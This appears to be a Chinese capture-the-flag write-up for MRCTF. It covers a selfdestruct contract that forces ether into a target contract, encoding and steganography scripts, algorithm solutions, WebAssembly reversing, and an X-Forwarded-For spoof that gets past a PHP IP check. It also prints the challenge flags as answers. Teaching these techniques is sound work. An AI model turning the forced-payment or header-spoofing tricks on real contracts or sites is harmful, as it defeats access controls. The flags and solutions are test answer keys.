\u90fd\u53ea\u5141\u8bb8\u63a5\u53d7\u5076\u6570\u500d 0.001 ether \u7684\u4ed8\u6b3e\uff0c\u800c\u5408\u7ea6\u7684 getflag \u51fd\u6570\u5219\u8981\u6c42\u5947\u6570\u500d 0.001 ether \u7684\u5408\u7ea6\u4f59\u989d\u624d\u53ef\u4ee5\u6267\u884c\uff08\u5e76\u6e05\u7a7a\u5408\u7ea6\u4f59\u989d\uff09\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u7ed5\u8fc7\u9650\u5236\u5411\u5408\u7ea6\u5730\u5740\u53d1\u9001ether\uff0c\u800c\u5408\u7ea6\u81ea\u6bc1\u6216\u6316\u77ff\u4ea7\u751f\u7684ether\u662f\u65e0\u6cd5\u62d2\u7edd\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u81ea\u6bc1\u5408\u7ea6\u8fbe\u5230\u6761\u4ef6\u3002 contract Payassist { function destroy_pay(address payable addr) public payable { selfdestruct(addr); } } pyflag \u9898\u76ee\u7075\u611f\uff1a\u51fa\u9898\u4eba\u611f\u89c9Misc\u5f88\u591a\u9898\u76ee\u6709\u7740\u76f8\u540c\u7684\u5957\u8def\uff0c\u60f3\u8981\u5c1d\u8bd5\u57fa\u4e8e\u7279\u5f81\u7684\u9690\u5199\u81ea\u52a8\u89e3\u51b3\u5de5\u5177...\u4e8e\u662f\u5c31\u6709\u4e86\u9898\u76ee\u7684\u6700\u540e\u4e00\u90e8\u5206 \u62ff\u5230\u9898\u76ee\u89e3\u538b\u7f29\u540e\u53d1\u73b0\u4e09\u5f20\u56fe\u7247\u3002\u65e0\u8bba\u662f\u4f7f\u7528strings\u547d\u4ee4\uff0c\u8fd8\u662f\u752816\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u56fe\u7247\uff0c\u90fd\u53ef\u4ee5\u53d1\u73b0\u6587\u4ef6\u672b\u5c3e\u9690\u85cf\u4e86\u4e00\u4e9b\u4fe1\u606f\u3002strings\u4f1a\u53d1\u73b0[Secret File Part 1-3]\u7684\u6807\u8bc6\uff0c\u800c16\u8fdb\u5236\u6253\u5f00\u5219\u53d1\u73b0\u6587\u4ef6\u5c3e\u7684\u7ed3\u675f\u7b26\u5e76\u975ejpg\u7684\u6807\u51c6\u7ed3\u675f\u7b26 FF D9 \u3002 \u4e8e\u662f\u5c06\u8fd9\u4e09\u6bb5\u9690\u85cf\u4fe1\u606f\u590d\u5236\u523016\u8fdb\u5236\u7f16\u8f91\u5668\u4e2d\uff0c\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u538b\u7f29\u5305\u3002 \u538b\u7f29\u5305\u5bc6\u7801\u662f\u5f31\u5bc6\u78011234 \u7136\u540e\u53d6\u5f97\u4e86\u4e00\u4e2aflag.txt\uff0c.hint\u5df2\u7ecf\u63d0\u793a\u4e86\u4f7f\u7528base16,32,64,85\u7684\u7f16\u7801\uff0c\u53ef\u4ee5\u7f16\u5199\u81ea\u52a8\u5316\u811a\u672c\u6765\u5904\u7406\uff0c\u4e5f\u53ef\u4ee5\u624b\u52a8\u5c1d\u8bd5\u3002\u53ea\u52a0\u5bc6\u4e86\u4e94\u5c42\uff0c\u624b\u52a8\u5c1d\u8bd5\u4e0d\u4f1a\u5f88\u8017\u8d39\u65f6\u95f4\u3002\u7f16\u5199py\u811a\u672c\u8fd9\u5c31\u9700\u8981\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u77e5\u8bc6\uff0c\u5e76\u638c\u63e1\u8fd9\u4e9b\u7f16\u7801\u7684\u6b63\u5219\u7279\u5f81\u3002 \u5982\u679c\u4f60\u9009\u62e9\u7f16\u5199\u811a\u672c\u89e3\u7801\uff0c\u90a3\u4e48\u8bf7\u6ce8\u610f\u4f7f\u7528\u7684\u51fd\u6570\u4f20\u5165\u7684\u53c2\u6570\u662fstr\uff08\"Astring\"\uff09\u8fd8\u662fbytes(b\"Astring\")\u3002\u5b57\u7b26\u6d41\u548c\u5b57\u8282\u6d41\u7684\u533a\u522b\u4e5f\u5f88\u91cd\u8981\uff0c\u53ef\u4ee5\u53bb\u4e86\u89e3\u4e00\u4e0b\uff0c\u660e\u786e\u5b83\u4eec\u7684\u533a\u522b\u53ef\u4ee5\u8ba9\u4f60\u5728\u6570\u636e\u5904\u7406\u65f6\u66f4\u52a0\u719f\u7ec3\u3002 #!/usr/bin/env python import base64 import re def baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: pass def detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4 def autoDec(text): while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) with open(\"flag.txt\",'rb') as f: flag = f.read() autoDec(flag) \u987a\u4fbf\u7ed9\u51fa\u6211\u7684\u52a0\u5bc6\u811a\u672c #!/usr/bin/env python import base64 import re key = \"31214\" # key\u672c\u6765\u975e\u5e38\u957f\u3002\u3002\u4f3c\u4e4e\u592a\u96be\u4e86\u6539\u7684\u7b80\u5355\u4e86\u70b9 # key = \"14332234124133132214311231\" flag = b\"MRCTF{Y0u_Are_4_p3rFect_dec0der}\" def baseEnc(text,type): if type == 1: return base64.b16encode(text) elif type == 2: return base64.b32encode(text) elif type == 3: return base64.b64encode(text) elif type == 4: return base64.b85encode(text) else: pass def baseDec(text,type): if type == 1: return base64.b16decode(text) elif type == 2: return base64.b32decode(text) elif type == 3: return base64.b64decode(text) elif type == 4: return base64.b85decode(text) else: pass def finalEnc(text,key): nf = text count = 1 for i in key: nf = baseEnc(nf,int(i,10)) #print(\"\u7b2c\"+str(count)+\"\u6b21\u52a0\u5bc6: \",nf) count +=1 return nf def finalDec(text,key): nf = text key = key[::-1] print(key) count = 1 for i in key: nf = baseDec(nf,int(i,10)) #print(\"\u7b2c\"+str(count)+\"\u6b21\u89e3\u5bc6: \",nf) count +=1 return nf def detect(text): try: if re.match(\"^[0-9A-F=]+$\",text.decode()) is not None: return 1 except: pass try: if re.match(\"^[A-Z2-7=]+$\",text.decode()) is not None: return 2 except: pass try: if re.match(\"^[A-Za-z0-9+/=]+$\",text.decode()) is not None: return 3 except: pass return 4 def autoDec(text): print(\"dec key:\",end=\"\") while True: if b\"MRCTF{\" in text: print(\"\\n\"+text.decode()) break code = detect(text) text = baseDec(text,code) print(str(code),end=\"\") fe = finalEnc(flag,key) with open(\"flag.txt\",'w') as f: f.write(fe.decode()) ''' ff = finalDec(fe,key) print(ff) ''' ff = autoDec(fe) \u6700\u540eflag\u5c31\u662f MRCTF{Y0u_Are_4_p3rFect_dec0der} cyberpunk! \u7b7e\u5230\u9898\u3002 \u6539\u65f6\u95f4\u6216\u8005\u9006\u5411\u90fd\u884c\u3002 \u4f46\u662f\u6602\u54e5\u52a0\u4e86\u4e2a\u58f3 \u4f30\u8ba1\u5927\u5bb6\u90fd\u4f1a\u53bb\u6539\u65f6\u95f4\u542723333\u3002 \u5343\u5c42\u5957\u8def Write Up \u4e3b\u8981\u8003\u5bdfpython\u811a\u672c\u7f16\u5199\u80fd\u529b \u867d\u7136\u662f\u5343\u5c42\u5957\u5a03\u4f46\u662f\u4e3a\u4e86\u4e0d\u90a3\u4e48\u6bd2\u7624\u5176\u5b9e\u53ea\u6709\u4e24\u5c42 \u7b2c\u4e00\u5c42\uff0c\u81ea\u52a8\u5316\u89e3\u538bzip \u8bd5\u51e0\u6b21\u5c31\u77e5\u9053zip\u7684\u89e3\u538b\u5bc6\u7801\u90fd\u662f\u5bf9\u5e94\u540d\u5b57\uff0c\u53ef\u4ee5\u5199\u811a\u672c #coding=utf-8 import os import zipfile orginal_zip = \"0573.zip\" while True: tag = orginal_zip orginal_zip = zipfile.ZipFile(orginal_zip) for contents in orginal_zip.namelist(): password = contents[0:contents.find('.')] print password orginal_zip.setpassword(tag[:-4]) try: orginal_zip.extractall() except: break if(len(tag)>6): os.system(\"rm \"+tag) orginal_zip=password+\".zip\" \u56e0\u4e3a\u535a\u5ba2\u91cc\u6709\u5199\u8fc7\u76f8\u5e94\u811a\u672c\uff0c\u8fd9\u91cc\u6539\u4e86\u4e0b\uff0c\u89e3\u538b\u5bc6\u7801\u90fd\u662f\u5bf9\u5e94\u540d\u5b57\u800c\u4e0d\u662f\u538b\u7f29\u5305\u91cc\u540d\u5b57\u3002\u6709\u4e2a\u53ef\u80fd\u7684\u5751\u662f\u5982\u679c\u4e0d\u5224\u65ad\u7684\u8bdd\uff0c\u7a0b\u5e8f\u8dd1\u5b8c\u4f1a\u81ea\u52a8\u628aqr.zip\u4e5f\u5220\u4e86 \u7136\u540e\u7b2c\u4e8c\u5c42\u5c31\u662fqr.txt \u91cc\u9762\u4e00\u5806 (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) (255, 255, 255) ... \u663e\u7136\u662f\u50cf\u7d20\u70b9 \u7528PIL\u5e93\u641e\u4e0b #coding=utf-8 from PIL import Image x = 200 #x\u5750\u6807 \u901a\u8fc7\u5bf9txt\u91cc\u7684\u884c\u6570\u8fdb\u884c\u6574\u6570\u5206 y = 200 #y\u5750\u6807 x * y = \u884c\u6570 im = Image.new(\"RGB\", (x, y)) file = open('qr.txt') for i in range(0, x): for j in range(0, y): line = file.readline() #\u83b7\u53d6\u4e00\u884c\u7684rgb\u503c line = line[:-2] line = line[1:] print line rgb = line.split(\", \") #\u5206\u79bbrgb\uff0c\u6587\u672c\u4e2d\u9017\u53f7\u540e\u9762\u6709\u7a7a\u683c im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) im.save('flag.png') \u62ff\u5230\u4e8c\u7ef4\u7801\uff0c\u626b\u4e00\u4e0b\u62ff\u5230flag flag=\"MRCTF{ta01uyout1nreet1n0usandtimes}\" ezmisc \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20png\u56fe\u7247\uff0c\u5728windows\u4e0b\u80fd\u6253\u5f00\u770b\u5230\uff0c\u62d6\u8fdbkali\u4e2d\u4f1a\u663e\u793aCRC error\uff0c\u7531\u6b64\u53ef\u4ee5\u63a8\u65ad \u56fe\u7247\u7684\u5bbd\u5ea6/\u9ad8\u5ea6\u6709\u95ee\u9898\uff0c\u53c8\u56e0\u4e3a\u56fe\u7247\u5bbd\u5ea6\u6709\u95ee\u9898\u65f6\u5728windows\u4e0b\u65e0\u6cd5\u6b63\u5e38\u6253\u5f00\u56fe\u7247\uff0c\u6240\u4ee5\u672c\u9898\u4e3a\u56fe\u7247 \u9ad8\u5ea6\u6709\u95ee\u9898\uff0c\u4fee\u6539\u56fe\u7247\u9ad8\u5ea6\u5373\u53ef\u770b\u5230flag\uff1a MRCTF{1ts_vEryyyyyy_ez!} \u9644\u4e0a\u6709\u5173CRC\u9519\u8bef\u7684\u9690\u5199\u5206\u6790\u7f51\u5740\uff1ahttps://www.bbsmax.com/A/gVdnlMVXJW/ ctfwiki\u4e2d\u4e5f\u6709\u5f88\u8be6\u7ec6\u7684\u4ecb\u7ecd\uff1ahttps://ctf-wiki.github.io/ctf-wiki/misc/picture/png-zh/ \u4f60\u80fd\u770b\u61c2\u97f3\u7b26\u5417 \u4e0b\u8f7d\u9644\u4ef6\uff0c\u89e3\u538b\u65f6\u62a5\u9519\uff0c\u653e\u8fdbwinhex\u67e5\u770b\uff0c\u53d1\u73b0rar\u6587\u4ef6\u5934\u9519\u8bef\uff0c\u5c06 6152 \u4fee\u6539\u4e3a 5261 \u540e\u518d\u89e3\u538b\uff0c\u5373 \u53ef\u5f97\u5230\u4e00\u4e2aword\u6587\u6863\uff0c\u6253\u5f00\u540e\u53d1\u73b0\u5185\u5bb9\u88ab\u9690\u85cf\uff0c\u641c\u7d22word\u9690\u5199\u53ef\u77e5\u5176\u9690\u5199\u65b9\u5f0f\uff0c\u5c06\u88ab\u9690\u85cf\u7684\u5185\u5bb9\u663e \u793a\u51fa\u6765\uff0c\u5f97\u5230\u4e00\u4e32\u97f3\u7b26\uff0c\u5728\u7ebf\u7f51\u5740\u89e3\u5bc6\u97f3\u7b26\u5373\u53ef\u5f97\u5230flag word\u9690\u5199\u65b9\u5f0f\uff08\u4f9b\u53c2\u8003\uff09\uff1ahttps://blog.csdn.net/q_l_s/article/details/53813971 \u89e3\u5bc6\u7f51\u5740\uff1ahttps://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue flag\uff1a MRCTF{thEse_n0tes_ArE_am@zing~} Algo \u81f4\u656cOI Description \u840c\u65b0\u60f3\u8981\u6574\u7406\u4ed6\u7684\u4f5c\u6218\u62a5\u544a\uff08\u7ecf\u9a8c\uff09\u4e66\u3002 \u840c\u65b0\u6709$n$\u672c\u7ecf\u9a8c\u4e66\uff0c\u5206\u6210\u4e86\u82e5\u5e72\u5806\uff08\u542b\u4e00\u5806\uff09\uff0c\u6bcf\u5806\u7ecf\u9a8c\u4e66\u4e0d\u5c11\u4e8e$l$\u672c\u4e14\u4e0d\u8d85\u8fc7$r$\u672c\u3002 \u840c\u65b0\u5c06\u6240\u6709\u6570\u91cf\u76f8\u540c\u7684\u5806\u5206\u4e3a\u4e00\u7c7b\uff0c\u5e76\u5c06\u5806\u6570\u4e0d\u5c11\u4e8e$k$\u7684\u7c7b\u5206\u522b\u88c5\u7bb1\u5b58\u653e\u3002 \u6240\u6709\u7ecf\u9a8c\u4e66\u90fd\u662f\u4e00\u6837\u7684\u3002 \u840c\u65b0\u60f3\u77e5\u9053\uff0c\u6240\u6709\u5212\u5206\u65b9\u6848\u9700\u8981\u7684\u7bb1\u5b50\u6570\u7684\u603b\u548c\uff08\u5bf9 65536 \u53d6\u6a21\uff09\u3002 \u6bcf\u7ec4\u8be2\u95ee\u5305\u62ec\u56db\u4e2a\u6574\u6570 $n,k,l,r$\u3002\u53ea\u8981\u8ba1\u7b97\u51fa\u840c\u65b0\u7684\u6240\u6709\u8be2\u95ee\uff0c\u5373\u53ef\u5f97\u5230 flag\u3002 Solution \u6bd4\u8d5b\u524d\u4e00\u5929\u5f3a\u884c\u9b54\u6539\u4e86\u4e00\u9053\u4ee5\u524d\u51fa\u7684NOIP\u6a21\u62df\u8d5b\u9898\u76ee\u3002\u96be\u5ea6NOIP+\u7701\u9009-\u5427\u3002 \u56e0\u4e3a\u6ca1\u6709\u65f6\u9650\uff0c\u6570\u636e\u8303\u56f4\u6539\u6210\u4e86$10^8$\uff0c$O(n^{1.5})$\u5927\u6982\u8dd1\u534a\u5c0f\u65f6\u4ee5\u5185\u5427\uff08\u6700\u540e\u51e0\u7ec4\u6570\u636e\u8dd1\u4e00\u8d77\u7b97\uff09\u3002 \u8bb0$n$\u6709$p_n$\u79cd\u4e0d\u540c\u7684\u5212\u5206\uff0c\u6570\u5b57$i$\u51fa\u73b0\u81f3\u5c11$k$\u6b21\u7684\u5212\u5206\u6709$p_{n-ik}$\u4e2a\uff0c\u4e00\u4e2a\u5212\u5206\u6b63\u597d\u4f1a\u88ab\u6bcf\u4e2a\u81f3\u5c11\u51fa\u73b0\u4e86$k$\u6b21\u7684\u6570\u5b57\u8ba1\u7b97\u4e00\u6b21\uff0c\u6240\u4ee5\u7b54\u6848\u5c31\u662f$$\\sum_{i=l}^r p_{n-ik}$$ \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(n(r-l))$\u3002 \u5f53$l \\geq \\sqrt{n}$\u65f6\uff0c\u6700\u591a\u53ea\u4f1a\u9009$\\sqrt{n}$\u4e2a\u6570\u3002 $f_{i,j}$\u8868\u793a$j$\u5212\u5206\u4e3a$i$\u4e2a$l$\u81f3$r$\u95f4\u7684\u6570\u4e4b\u548c\u7684\u65b9\u6848\u6570\uff0c\u6709$$f_{i,j}=f_{i,j-i}+f_{i-1,j-l}-f_{i-1,j-i-r}$$ $f_{i,j-i}$\u8868\u793a\u5c06$i$\u4ef6\u7269\u54c1\u603b\u4f53\u79ef\u4e3a$j-i$\u7684\u6240\u6709\u65b9\u6848\u4e2d\u7684\u6240\u6709\u7269\u54c1\u4f53\u79ef\u52a0\u4e00\uff1b $f_{i-1,j-l}$\u8868\u793a\u5c06$i-1$\u4ef6\u7269\u54c1\u603b\u4f53\u79ef\u4e3a$j-l$\u7684\u6240\u6709\u65b9\u6848\u4e2d\u52a0\u5165\u4e00\u4e2a\u4f53\u79ef\u4e3a$l$\u7684\u7269\u54c1\uff1b \u6700\u540e\u518d\u51cf\u53bb\u51fa\u73b0\u4e86\u4f53\u79ef\u4e3a$r+1$\u7684\u7269\u54c1\u7684\u65b9\u6848\u6570\uff0c\u5373$f_{i-1,j-i-r}$\u3002 \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(\\frac{n^2}{l})$\u3002 \u8bbe\u7f6e\u4e00\u4e2a\u9608\u503c$x$\uff0c$f_{i,j}$\u8868\u793a$j$\u5212\u5206\u4e3a$i$\u4e2a$x$\u81f3$r$\u95f4\u7684\u6570\u4e4b\u548c\u7684\u65b9\u6848\u6570\u3002 \u7528\u5b8c\u5168\u80cc\u5305\u6c42\u51fa${f_{0,n}}$\uff0c\u5373$n$\u5212\u5206\u4e3a\u6570\u4e2a$l$\u81f3$x-1$\u4e2d\u6570\u4e4b\u548c\u7684\u65b9\u6848\u6570\uff1b\u518d\u5957\u7528\u89e3\u6cd5\u4e09\u5373\u53ef\u3002 \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(n(x-l)+\\frac{n^2}{x})$\u3002 $x$\u53d6$\\mathcal{O}(\\sqrt{n})$\u65f6\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u6700\u4f18\uff0c\u4e3a$\\mathcal{O}(n^{1.5})$\u3002 #pragma GCC optimize(\"Ofast\") #include <cmath> #include <ctime> #include <cctype> #include <cstdio> #include <cstring> #include <algorithm> using namespace std; typedef unsigned short ushort; const int N = 1e8 + 10; int n, l, r, x, mx; ushort _[2][N], *f = _[0], *g = _[1], p[N]; void init(int n, int l, int r) { auto t0 = time(0); ::n = n, ::l = l, ::r = r; x = min(r + 1, max(l, (int)sqrt(n))); mx = x > r ? 0 : n / x; memset(_, 0, sizeof(_)); memset(p, 0, sizeof(p)); f[0] = 1; for (int i = l; i < x; ++i) { auto t = time(0); double now = 1.0 * i / (x - l + mx); if (t - t0 >= 10) { t0 = t; fprintf(stderr, \"%lf%c completed.\\n\", now * 100, '%'); } for (int j = i; j <= n; ++j) { f[j] += f[j - i]; } } for (int i = 0; i <= n; ++i) { p[i] += f[i]; } for (int i = 1; i <= mx; ++i) { auto t = time(0); double now = 1.0 * (x - l + i) / (x - l + mx); if (t - t0 >= 10) { t0 = t; fprintf(stderr, \"%lf%c completed.\\n\", now * 100, '%'); } swap(f, g); memset(f, 0, sizeof(ushort) * x * i); for (int j = x * i; j <= n; ++j) { f[j] = f[j - i] + g[j - x]; j - r - i >= 0 ? f[j] -= g[j - r - i] : 0; p[j] += f[j]; } } } ushort solve(int n, int k, int l, int r) { if (n != ::n || l != ::l || r != ::r) { init(n, l, r); } ushort ans = 0; for (int i = l, t = min(1ll * k * l, n + 1ll); i <= r && t <= n; ++i, t += k) { ans += p[n - t]; } return ans; } int main() { freopen(\"in.txt\", \"r\", stdin); int n, k, l, r, length = 0; char flag[100] = \"\"; while (scanf(\"%d%d%d%d\", &n, &k, &l, &r) != EOF) { auto &&ans = solve(n, k, l, r); flag[length++] = ans >> 8; flag[length++] = ans & 255; printf(\"flag = %s\\n\", flag); } return 0; } \u4ee5\u4e0b\u4e24\u79cd\u89e3\u6cd5\u6539\u4e86\u6a21\u6570\u540e\u6211\u6ca1\u60f3\u8fc7\uff0c\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u5199\u3002 \u89e3\u6cd5\u4e8c \u8003\u8651\u751f\u6210\u51fd\u6570\u3002\u8bb0$P(x)$\u4e3a${p_n}$\u7684\u666e\u901a\u578b\u751f\u6210\u51fd\u6570\uff0c\u6709 $$P(x)=\\prod_{i=l}^r \\frac{1}{1-x^i}$$ \u8bb0$$G(x)=\\sum_{i=0}^{\\infty} g_i x^i=\\prod_{i=l}^r (1-x^i)$$ \u5219\u6709$P(x)=G^{-1}(x)$\uff0c\u82e5\u6c42\u51fa$G(x)$\uff0c\u591a\u9879\u5f0f\u6c42\u9006\u5143\u5373\u53ef\u6c42\u51fa$P(x)$\u3002 \u53ef\u4ee5\u770b\u51fa\uff0c${g_n}$\u4e3a\u7269\u54c1\u4f53\u79ef\u4e3a$l$\u81f3$r$\u768401\u80cc\u5305\u7684\u5076\u6570\u4e0e\u5947\u6570\u4ef6\u7269\u54c1\u7684\u65b9\u6848\u6570\u4e4b\u5dee\u3002 \u663e\u7136\u81f3\u591a\u9009$\\mathcal{O}(\\sqrt{n})$\u4ef6\u7269\u54c1\u3002\u4ee4$h_{i,j}$\u8868\u793a$i$\u4ef6\u7269\u54c1\u603b\u4f53\u79ef\u4e3a$j$\u7684\u65b9\u6848\u6570\uff0c\u6709$$h_{i,j}=h_{i,j-i}+h_{i-1,j-(i-1)-l}-h_{i-1,j-r-1}$$ \u65f6\u95f4\u590d\u6742\u5ea6$\\mathcal{O}(n^{1.5} + n \\log n)$\u3002 \u89e3\u6cd5\u4e09 \u7b2c\u4e09\u7c7b\u6b27\u62c9\u53d8\u6362 \u3002 $$P(x) = \\prod_{i=1}^{\\infty} \\frac{1}{(1-x^i)^{a_i}}$$ \u8bb0$A(x)$\u4e3a${a_n}$\u7684\u666e\u901a\u578b\u751f\u6210\u51fd\u6570\uff0c\u6709 $$P(x) = \\exp \\left(\\sum_{i=1}^{\\infty} \\frac{A(x^i)}{i} \\right)$$ \u65f6\u95f4\u590d\u6742\u5ea6$O(n \\log n)$\u3002 \u5c0fO\u7684\u8003\u7814\u590d\u8bd5\u3002 \u95ee\u9898\u662fn\u4e2ak\u5bf9\uff081e9+7\uff09\u53d6\u6a21\u7684\u503c \u7ed9\u51fak=2,n=19260817 \u7b2c\u4e00\u79cd \u8003\u8651wolf alpha\u76f4\u63a5\u51fa\u3002 \u7b2c\u4e8c\u79cd \u5feb\u901f\u5e42+\u4e58\u6cd5\u9006\u5143 \uff08ksm(10,n)-1\uff09*(ksm(9,mod-2)*n) \u7b2c\u4e09\u79cd \u6838\u5fc3\u4ee3\u7801 for(int i=0;i<19260817;i++) { a=(a*10+2)%mod; } Web Not So Web Application \u9996\u5148\u662f\u9898\u76ee\u8bf4\u660e\uff0c\u8fd9\u73a9\u610f\u672c\u6765\u6ca1\u8fd9\u4e48\u6076\u5fc3\uff08\u6ca1\u4f2a\u88c5\u52a0\u4e0a User \u548c SQL \u90a3\u4e2a SVG\uff09 \u672c\u9898\u4e3b\u8981\u96be\u70b9\u5728\u4e8e Web Assembly \u81f3\u4eca\u6ca1\u6709\u4e2a\u80fd\u7528\u7684\u8c03\u8bd5\u5668\uff08\u53ef\u80fd\u4e0b\u8f88\u5b50\u4e5f\u6ca1\u6709\u80fd\u7528\u7684\uff09\uff0c \u6240\u4ee5\u9700\u8981\u591a\u79cd\u624b\u6bb5\u52a8\u8c03+\u9759\u6001\u8c03\u8bd5\u3002 \u53ef\u4ee5\u5148\u901a\u8fc7\u548c\u5176\u4ed6 Qt for Web Assembly \u7a0b\u5e8f\u6bd4\u5bf9\uff0c\u53bb\u6389\u4e00\u5927\u534a\u7591\u4f3c\u51fd\u6570\uff0c\u540c\u65f6 \u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5b57\u7b26\u4e32\uff08Incorrect\u7b49\uff09\u786e\u5b9a\u5927\u6982\u76f8\u5173\u51fd\u6570\u4f4d\u7f6e\u3002 \u540c\u65f6\u901a\u8fc7\u7ed9\u8f93\u5165\u6846\u585e\u5165\u5927\u91cf\u5783\u573e\uff08>64KB\uff0cwasm\u57fa\u672c\u5185 \u5b58\u5355\u4f4d\uff09\u89e6\u53d1\u5185\u5b58\u8d8a\u754c\u9519\u8bef\u627e\u5230\u53d8\u91cf\u5b58\u50a8\u4f4d\u7f6e\u3002\u6700\u7ec8\u5728\u6d4f\u89c8\u5668\u91cc\u52a8\u8c03\u548c wasm2c \u7684\u8f85\u52a9\u53ef\u4ee5\u627e\u5230flag\u52a0\u5bc6\u540e\u5185\u5bb9\u548c\u6bd4\u5bf9 \u7b97\u6cd5 \u53ef\u4ee5\u770b\u4e0b\u4e4b\u524d\u5927\u4f6c\u53d1\u7684\u6587\u7ae0 \u63a8\u8350\u9605\u8bfb https://processor.pub/2018/12/23/WASM%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/ PYWebsite \u4e00\u9053\u7b80\u5355\u7684\u524d\u7aeftrick\u9898\u76ee\uff0c\u5e0c\u671b\u66f4\u591a\u4eba\u6ce8\u610f\u5230\u524d\u7aef\u9a8c\u8bc1\u662f\u4e0d\u5b89\u5168\u7684\u3002 \u9996\u5148\u8fc7\u4e00\u904d\u4e1a\u52a1\u903b\u8f91\uff0c\u662f\u8d2d\u4e70\u6388\u6743\u7801\uff0c\u518d\u9a8c\u8bc1\u6388\u6743\u7801\u7684\u8fc7\u7a0b\u3002\u81ea\u7136\u60f3\u5230\u5ba1\u8ba1\u9a8c\u8bc1\u8fc7\u7a0b\u7684\u6f0f\u6d1e\u3002\u70b9\u51fb\u6309\u94ae\u5f39\u51fa\u7a97\u53e3\u662fjs\u63a7\u5236\u7684\uff0c\u8fdb\u800c\u731c\u6d4b\u9a8c\u8bc1\u903b\u8f91\u5904\u4e8e\u524d\u7aef\uff0c\u4e8e\u662f\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u903b\u8f91\u5982\u4e0b: \u4e0d\u77e5\u9053MD5\uff1f\u4e8b\u5b9e\u4e0a\u6211\u4eec\u6839\u672c\u4e0d\u9700\u8981\u7406\u4f1a\u524d\u7aef\u7684\u9a8c\u8bc1\uff0c\u53ea\u9700\u8981\u76f4\u63a5\u8df3\u8f6c\u5230flag.php\u5373\u53ef\u3002 \uff08md5(\"ARandomString\")\uff09 \u8fdb\u5165flag.php\uff0c\u9898\u76ee\u544a\u8bc9\u6211\u4eec\u53ea\u6709\u7279\u5b9a\u7684IP\u624d\u80fd\u8bbf\u95ee\uff0c\u5e76\u4e14\u662f\u540e\u7aef\u9a8c\u8bc1\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5e94\u7528\u5c42\u4f7f\u7528XFF\u9a8c\u8bc1IP\u4e5f\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002PHP\u4f7f\u7528X-Forward-For\u8fd9\u4e2ahttp\u7684\u8bf7\u6c42\u5934\u6765\u9a8c\u8bc1\uff0c\u800c\u8fd9\u4e2a\u8bf7\u6c42\u5934\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020\u3002 \u6211\u4eec\u4e0d\u77e5\u9053\u8d2d\u4e70\u8005\u7684IP\uff0c\u4f46\u662f\u77e5\u9053\u201c\u81ea\u5df1\u201d\u7684IP\uff0c\u4e5f\u5c31\u662f\u672c\u5730\u73af\u56de\u5730\u5740 127.0.0.1 \u3002\u56e0\u6b64\u53ea\u9700\u8981\u7528\u6293\u5305\u8f6f\u4ef6\u6293\u5230HTTP\u7684\u8bf7\u6c42\u5305\uff0c\u8fdb\u884c\u4fee\u6539\uff08\u52a0\u5165 X-Forwarded-For: 127.0.0.1 \u4e00\u884c\uff09\u5c31\u53ef\u4ee5\u6b3a\u9a97\u8fc7\u9a8c\u8bc1\u903b\u8f91\u3002 \u6700\u540e\u7684flag\u5b57\u4f53\u6211\u8c03\u6210\u4e86\u767d\u8272hhh \u6240\u4ee5\u8981\u591a\u89c2\u5bdf\u6e90\u4ee3\u7801 \u540e\u7aef\u7684\u9a8c\u8bc1\u903b\u8f91\u4e00\u822c\u5982\u4e0b\uff1a function checkXFF() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; if (strpos($ip, \"127.0.0.1\") !== false) { return true; } } return false; } \u987a\u4fbf\u4e00\u63d0\uff0c\u5982\u4f55\u9a8c\u8bc1\u7528\u6237\u7684\u771f\u5b9eIP\u5462\uff1f\u786e\u5b9e\u4e0d\u597d\u529e\u3002\u56e0\u4e3a\u7528\u6237\u53ef\u80fd\u4f7f\u7528\u4ee3\u7406\uff08\u79f0\u4e3a\u6b63\u5411\u4ee3\u7406\uff09\uff0c\u6211\u4eec\u7684\u670d\u52a1\u5668\u56e0\u4e3a\u4e1a\u52a1\u9700\u6c42\uff0c\u4e5f\u4f1a\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\u7b49\u8f6c\u53d1\u64cd\u4f5c\uff08\u79f0\u4e3a\u53cd\u5411\u4ee3\u7406\uff09\u3002\u4f46\u5982\u679c\u8fd9\u4e2a\u8fc7\u7a0b\u6ca1\u6709\u7ecf\u8fc7\u4ee3\u7406\uff0c\u4e00\u822c\u4f7f\u7528Remote_Addr\u662f\u53ef\u4ee5\u83b7\u5f97\u771f\u5b9eIP\u7684\u3002 flag: MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!} Ez_bypass \u5f88\u7b80\u5355\u7684bypass \u7b2c\u4e00\u6b65md5\u597d\u591a\u79cd\u7ed5\u8fc7\u65b9\u6cd5\u3002 